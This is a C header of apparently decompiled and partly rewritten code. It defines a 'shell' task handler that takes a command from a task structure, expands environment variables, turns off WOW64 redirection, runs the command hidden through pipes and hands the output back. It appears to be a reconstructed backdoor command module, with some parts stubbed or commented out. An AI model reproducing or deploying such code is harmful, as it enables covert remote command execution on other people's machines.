#pragma once
#include "data_struct.h"
#include "data_deal.h"
#include "PipeCmd.h"
#include "task.h"

DWORD env_extend(LPCSTR lpSrc, void* a2, size_t Size)
{

	size_t v3; // rdi
	DWORD v6; // eax
	DWORD v7; // ebx

	v3 = (unsigned int)Size;
	v6 = ExpandEnvironmentStringsA(lpSrc, 0i64, 0);
	v7 = v6;
	if (!v6 || v6 + 1 >= (unsigned int)v3)
		return 0;
	memset(a2, 0, v3);
	return ExpandEnvironmentStringsA(lpSrc, (LPSTR)a2, v7);
}
FARPROC __fastcall sub_180010988(DWORD_PTR* a1)
{
	HMODULE v2; // rax
	FARPROC result; // rax

	v2 = GetModuleHandleA("kernel32");
	result = GetProcAddress(v2, "Wow64DisableWow64FsRedirection");
	if (result)
		result = (FARPROC)((__int64(__fastcall*)(DWORD_PTR*))result)(a1);
	return result;
}

__int64 __fastcall sub_18000EF38(int a1, int a2)
{
	__int64 result; // rax
	HANDLE hHandle[2]; // [rsp+38h] [rbp-79h] BYREF
	__int64 v6; // [rsp+48h] [rbp-69h]
	HANDLE hReadPipe; // [rsp+50h] [rbp-61h] BYREF
	struct _SECURITY_ATTRIBUTES PipeAttributes; // [rsp+58h] [rbp-59h] BYREF
	unsigned long long  v9[2]; // [rsp+78h] [rbp-39h] BYREF
	__int64 v10; // [rsp+88h] [rbp-29h]
	struct _STARTUPINFOA StartupInfo; // [rsp+98h] [rbp-19h] BYREF
	HANDLE hWritePipe; // [rsp+130h] [rbp+7Fh] BYREF

	memset(&StartupInfo, 0, sizeof(StartupInfo));
	StartupInfo.cb = 104;
	hHandle[0] = 0i64;
	hHandle[1] = 0i64;
	v6 = 0i64;
	PipeAttributes.nLength = 24;
	PipeAttributes.lpSecurityDescriptor = 0i64;
	PipeAttributes.bInheritHandle = 1;
	CreatePipe(&hReadPipe, &hWritePipe, &PipeAttributes, 0x100000u);
	GetStartupInfoA(&StartupInfo);
	StartupInfo.hStdOutput = hWritePipe;
	StartupInfo.hStdError = hWritePipe;
	StartupInfo.dwFlags = 257;
	StartupInfo.wShowWindow = 0;
	StartupInfo.hStdInput = 0i64;
	//result = sub_1800151C0(a1, a2, (int)&StartupInfo, (int)hHandle, 16, 0);
	//if ((DWORD)result)
	//{
	//	WaitForSingleObject(hHandle[0], 0x2710u);
	//	v9 = *(_OWORD*)hHandle;
	//	v10 = v6;
	//	result = sub_180012AC4((__int64)&v9, (__int64)hReadPipe, (__int64)hWritePipe);
	//}
	//return result;
	return 1;
}
FARPROC __fastcall sub_1800109C0(__int64 a1)
{
	HMODULE v2; // rax
	FARPROC result; // rax

	v2 = GetModuleHandleA("kernel32");
	result = GetProcAddress(v2, "Wow64RevertWow64FsRedirection");
	if (result)
		result = (FARPROC)((__int64(__fastcall*)(__int64))result)(a1);
	return result;
}
void* __fastcall sub_180013DC4(__int64 a1)
{
	return memset(*(void**)a1, 0, *(int*)(a1 + 20));
}
void __fastcall sub_180013E0C(void* Block)
{
	free(*(void**)Block);
	free(Block);
}
void shell(void* a1, int a2)
{
	struc_1* v4; // r12
	void* v5; // rbp
	void* v6; // rsi
	void* v7; // r14
	char* v8; // r15
	unsigned __int16 v9; // bx
	__int64 v10; // rax
	__int64 v11; // rax
	struc_1 v13; // [rsp+20h] [rbp-48h] BYREF
	DWORD_PTR v14; // [rsp+80h] [rbp+18h] BYREF

	v4 = (struc_1*)init_struc1_malloc_Memory(0x8000);
	v5 = (struc_1*)get_ptr_struc1_index2_OffsetN(v4, 0x2000);
	v6 = (void*)get_ptr_struc1_index2_OffsetN(v4, 0x2000);
	v7 = (struc_1*)get_ptr_struc1_index2_OffsetN(v4, 0x2000);
	v8 = (char*)get_ptr_struc1_index2_OffsetN(v4, 0x2000);
	init_struc1((struc_1*)&v13, a1, a2);
	copy_struc_1_Nsize_src((struc_1*)v5, &v13, 0x2000i64);
	copy_struc_1_Nsize_src((struc_1*)v7, &v13, 0x2000i64);
	v9 = get_short_struc1_index2((struc_1*)&v13);
	//sub_180010904(v5, v6, 0x2000ui64);
	env_extend((LPCSTR)v5, v6, 0x2000);
	strncat_s(v8, 0x2000ui64, (const char*)v6, 0x2000ui64);
	strncat_s(v8, 0x2000ui64, (const char*)v7, 0x2000ui64);
	if ((v9 & 1) != 0)
	{
		sub_180010988(&v14);
		v10 = -1i64;
		do
			++v10;
		while (v8[v10]);
		//shell
		printf("%s\n", v8);
		/*sub_18000EF38(v8, (unsigned int)(v10 + 1), v9);
		sub_1800109C0(v14);*/
	}
	else
	{
		v11 = -1i64;
		do
			++v11;
		while (v8[v11]);
		//shell
		char* result_buffer = (char*)malloc(0x400);
		DWORD result_size = 0x400;
		PipeCmd(v8, result_buffer, result_size);
		sub_100012CF(result_buffer, result_size, 0x1e);
		free(result_buffer);
		//sub_18000EF38(v8, (unsigned int)(v11 + 1), v9);
	}
	return sub_180013E0C(v4);
}
